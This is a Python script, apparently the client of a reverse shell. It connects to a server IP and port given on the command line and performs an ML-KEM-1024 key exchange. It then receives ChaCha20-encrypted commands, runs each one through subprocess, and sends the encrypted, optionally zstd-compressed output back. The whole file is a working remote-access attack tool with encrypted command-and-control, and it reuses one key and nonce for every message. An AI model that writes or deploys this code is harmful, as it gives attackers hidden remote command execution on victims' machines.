#!/usr/bin/env python3

import socket
import argparse
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from kyber_py.ml_kem import ML_KEM_1024
from zstandard import ZstdCompressor
import subprocess

def chacha20_encrypt(data, key, nonce):
    cipher = Cipher(algorithms.ChaCha20(key, nonce), mode=None, backend=default_backend())
    encryptor = cipher.encryptor()
    return encryptor.update(data)

def chacha20_decrypt(data, key, nonce):
    cipher = Cipher(algorithms.ChaCha20(key, nonce), mode=None, backend=default_backend())
    decryptor = cipher.decryptor()
    return decryptor.update(data)

def reverse_shell(server_ip, server_port, compression):
    mlkem = ML_KEM_1024
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((server_ip, server_port))

    try:
        server_public_key = client.recv(4096)

        shared_key, ciphertext = mlkem.encaps(server_public_key)
        client.send(ciphertext)

        derived_key = HKDF(
            algorithm=hashes.SHA256(),
            length=48,
            salt=None,
            info=b'handshake data',
            backend=default_backend()
        ).derive(shared_key)

        key = derived_key[:32]
        nonce = derived_key[32:48]

        while True:
            encrypted_command = client.recv(4096)
            if not encrypted_command:
                break
            command = chacha20_decrypt(encrypted_command, key, nonce).decode('utf-8')
            if command.lower() == "exit":
                client.close()
                break
            output = subprocess.getoutput(command)
            if output == "" or output is None:
                output = "No output"
            if compression:
                output = ZstdCompressor().compress(output.encode('utf-8'))
            else:
                output = output.encode('utf-8')
            encrypted_output = chacha20_encrypt(output, key, nonce)
            client.send(encrypted_output)
    except Exception as e:
        print(f"[!] Error: {e}")
        client.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-s", "--server", required=True, help="Server IP address")
    parser.add_argument("-p", "--port", required=True, type=int, help="Server port")
    parser.add_argument("-c", "--compression", action="store_true", help="Enable compression")
    args = parser.parse_args()
    reverse_shell(args.server, args.port, args.compression)